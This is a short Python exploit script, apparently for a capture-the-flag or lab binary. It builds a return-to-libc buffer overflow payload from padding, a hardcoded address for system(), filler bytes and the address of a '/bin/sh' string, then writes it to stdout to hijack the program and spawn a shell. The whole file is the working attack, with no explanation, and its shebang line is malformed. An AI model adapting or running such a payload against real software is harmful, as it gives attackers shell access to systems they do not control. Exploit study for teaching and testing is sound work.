#/bash/bin/python3
import sys
import struct


system_addr = 0x8052530
padding = b'A' * 22
bin_sh_addr = 0x80be1ed

padding2 = b'A' * 4
payload = padding + struct.pack("<I", system_addr) + padding2 + struct.pack("<I", bin_sh_addr)

sys.stdout.buffer.write(payload)
